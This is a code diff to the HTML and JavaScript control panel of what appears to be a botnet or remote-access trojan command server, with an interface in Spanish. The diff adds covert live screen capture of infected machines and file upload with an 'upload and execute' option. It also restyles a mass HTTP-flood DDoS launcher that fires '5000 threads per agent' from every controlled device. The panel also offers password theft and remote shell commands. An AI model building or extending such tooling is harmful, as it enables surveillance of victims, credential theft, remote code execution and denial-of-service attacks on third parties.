@@ -24,9 +24,35 @@
             </div>
 
             <div class="input-area">
+                <input type="file" id="file-input" style="display: none;" onchange="handleFileUpload(this)">
+                <button onclick="document.getElementById('file-input').click()"
+                    style="background: var(--accent); width: auto; padding: 0 1.5rem;"
+                    title="Subir archivo/foto">📁</button>
+                <button onclick="toggleLiveMonitor()" id="monitor-btn"
+                    style="background: #ff9f43; width: auto; padding: 0 1.5rem;"
+                    title="Ver pantalla en tiempo real">🖥️</button>
                 <input type="text" id="cmd-field" placeholder="Comando (passwords, sysinfo, shell <comando>)...">
                 <button onclick="sendCmd()">EJECUTAR</button>
             </div>
+
+            <div id="live-monitor-modal"
+                style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80%; height: 80%; background: #000; border: 2px solid var(--primary); border-radius: 20px; z-index: 1000; box-shadow: 0 0 50px rgba(0,0,0,0.9); overflow: hidden;">
+                <div
+                    style="padding: 10px 20px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333;">
+                    <span id="monitor-title">LIVE MONITOR: AGENT</span>
+                    <button onclick="toggleLiveMonitor()"
+                        style="width: auto; padding: 5px 15px; background: #ff4444; border-radius: 5px;">CERRAR</button>
+                </div>
+                <div id="monitor-container"
+                    style="width: 100%; height: calc(100% - 50px); display: flex; align-items: center; justify-content: center;">
+                    <img id="live-screen-img" src="" style="max-width: 100%; max-height: 100%; display: block;">
+                </div>
+            </div>
+            <div id="monitor-overlay" onclick="toggleLiveMonitor()"
+                style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 999;">
+            </div>
+
+
         </main>
     </div>
 
@@ -70,12 +96,55 @@
             } catch (e) { console.error(e); }
         }
 
+        let monitoringInterval = null;
+
+        function toggleLiveMonitor() {
+            if (!currentAgent || currentAgent === 'all') return alert("Selecciona un agente primero.");
+
+            const modal = document.getElementById('live-monitor-modal');
+            const overlay = document.getElementById('monitor-overlay');
+            const isVisible = modal.style.display === 'block';
+
+            if (!isVisible) {
+                // Abrir
+                modal.style.display = 'block';
+                overlay.style.display = 'block';
+                document.getElementById('monitor-title').innerText = `MONITORIZANDO: ${currentAgent}`;
+
+                // Empezar a pedir capturas cada 2 segundos
+                monitoringInterval = setInterval(() => {
+                    fetch('/api/v1/command', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ id: currentAgent, command: 'screenshot' })
+                    });
+                }, 2000);
+            } else {
+                // Cerrar
+                modal.style.display = 'none';
+                overlay.style.display = 'none';
+                clearInterval(monitoringInterval);
+                monitoringInterval = null;
+            }
+        }
+
         async function updateResults() {
-            if (!currentAgent) return;
+            if (!currentAgent || currentAgent === 'all') return;
             try {
+
                 const res = await fetch(`/api/v1/results/${currentAgent}`);
                 const data = await res.json();
                 const terminal = document.getElementById('terminal');
+
+                // Si estamos monitoreando, buscar la última imagen
+                if (monitoringInterval) {
+                    const lastImg = Object.values(data).sort((a, b) => a.timestamp < b.timestamp ? 1 : -1).find(i => i.result.startsWith("[IMAGE_DATA]"));
+                    if (lastImg) {
+                        const b64 = lastImg.result.replace("[IMAGE_DATA]", "");
+                        document.getElementById('live-screen-img').src = "data:image/jpeg;base64," + b64;
+                    }
+                }
+
 
                 // Si no hay datos (o se borraron), limpiar terminal
                 if (!data || Object.keys(data).length === 0) {
@@ -130,20 +199,45 @@
 
             if (id === 'all') {
                 terminal.innerHTML = `
-                    <div style="text-align:center; padding: 20px;">
-                        <h2 style="color:var(--accent)">MODO DE CONTROL MASIVO</h2>
-                        <p>Los comandos enviados aquí se ejecutarán en TODOS los agentes conectados.</p>
-                        
-                        <div style="border: 1px solid #333; padding: 20px; border-radius: 10px; margin-top: 20px; text-align: left;">
-                            <h3 style="color:#ff4444">⚠ Distributed Stress Test (DDOS)</h3>
-                            <label>Objetivo (URL):</label>
-                            <input type="text" id="ddos-target" placeholder="http://ejemplo.com" style="width:100%; padding:10px; margin: 10px 0; background:#222; border:1px solid #444; color:white;">
-                            <label>Duración (segundos):</label>
-                            <input type="number" id="ddos-time" value="60" style="width:100%; padding:10px; margin: 10px 0; background:#222; border:1px solid #444; color:white;">
-                            <button onclick="launchDDOS()" style="width:100%; background:#ff4444; color:white; padding:10px; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">INICIAR ATAQUE COORDINADO</button>
+                    <div style="text-align:center; padding: 40px; max-width: 600px; margin: 0 auto;">
+                        <div style="background: linear-gradient(135deg, rgba(255, 68, 68, 0.1) 0%, rgba(255, 68, 68, 0.0) 100%); padding: 30px; border-radius: 20px; border: 1px solid rgba(255, 68, 68, 0.3); box-shadow: 0 0 30px rgba(255, 0, 0, 0.1);">
+                            <h2 style="color:#ff4444; margin: 0; font-size: 1.8rem; letter-spacing: 2px;">⚠ MASSIVE HYPER-FLOOD</h2>
+                            <p style="color:rgba(255, 255, 255, 0.6); margin-top: 10px;">Comando masivo para TODOS los dispositivos bajo control.</p>
+                            
+                            <div style="margin-top: 40px; text-align: left;">
+                                <div style="margin-bottom: 20px;">
+                                    <label style="display: block; font-size: 0.75rem; color: #ff4444; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; font-weight: bold;">Objetivo (URL/IP):</label>
+                                    <input type="text" id="ddos-target" placeholder="https://target-website.com" style="width:100%; padding:15px; background:rgba(0,0,0,0.5); border:1px solid #444; border-radius:10px; color:white; font-family:'JetBrains Mono'; font-size: 1rem;">
+                                </div>
+                                
+                                <div style="margin-bottom: 30px;">
+                                    <label style="display: block; font-size: 0.75rem; color: #ff4444; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; font-weight: bold;">Duranción del Ataque (segundos):</label>
+                                    <input type="number" id="ddos-time" value="60" style="width:100%; padding:15px; background:rgba(0,0,0,0.5); border:1px solid #444; border-radius:10px; color:white; font-family:'JetBrains Mono'; font-size: 1rem;">
+                                </div>
+                                
+                                <button onclick="launchDDOS()" style="width:100%; background: linear-gradient(90deg, #ff4444, #cc0000); color:white; padding:18px; border:none; border-radius:12px; font-weight:bold; cursor:pointer; font-size: 1.1rem; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3);">
+                                    🚀 INICIAR ATAQUE DESTRUCTIVO
+                                </button>
+                                
+                                <div style="margin-top: 20px; display: flex; gap: 10px; justify-content: space-between;">
+                                    <div style="flex: 1; background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 8px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1);">
+                                        <div style="font-size: 0.6rem; color: var(--text-dim);">PROTOCOL</div>
+                                        <div style="font-size: 0.8rem; font-weight: bold;">HTTP FLOOD</div>
+                                    </div>
+                                    <div style="flex: 1; background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 8px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1);">
+                                        <div style="font-size: 0.6rem; color: var(--text-dim);">THREADS</div>
+                                        <div style="font-size: 0.8rem; font-weight: bold;">5000 / AGENT</div>
+                                    </div>
+                                    <div style="flex: 1; background: rgba(255, 255, 255, 0.05); padding: 10px; border-radius: 8px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.1);">
+                                        <div style="font-size: 0.6rem; color: var(--text-dim);">BYPASS</div>
+                                        <div style="font-size: 0.8rem; font-weight: bold;">ENABLED</div>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 `;
+
                 updateAgents();
             } else {
                 terminal.innerHTML = `[SYSTEM] Sesión abierta con ${id}. Cargando historial...`;
@@ -152,7 +246,33 @@
             }
         }
 
+        async function handleFileUpload(input) {
+            if (!currentAgent || currentAgent === 'all') return alert("Selecciona un agente primero.");
+
+            const file = input.files[0];
+            if (!file) return;
+
+            const reader = new FileReader();
+            reader.onload = async function () {
+                const base64 = reader.result.split(',')[1];
+                const filename = file.name;
+                const cmdField = document.getElementById('cmd-field');
+
+                // Ponemos 'upload' por defecto
+                cmdField.value = `upload ${filename} ${base64}`;
+                cmdField.focus();
+
+                // Informamos de las opciones
+                alert(`Archivo cargado.\n\nComandos disponibles en la barra:\n- upload: Solo subir\n- upload_exe: Subir y ejecutar (.exe)\n- wallpaper_file: Poner como fondo`);
+                input.value = "";
+            };
+            reader.readAsDataURL(file);
+        }
+
+
+
         function launchDDOS() {
+
             const target = document.getElementById('ddos-target').value;
             const time = document.getElementById('ddos-time').value;
 
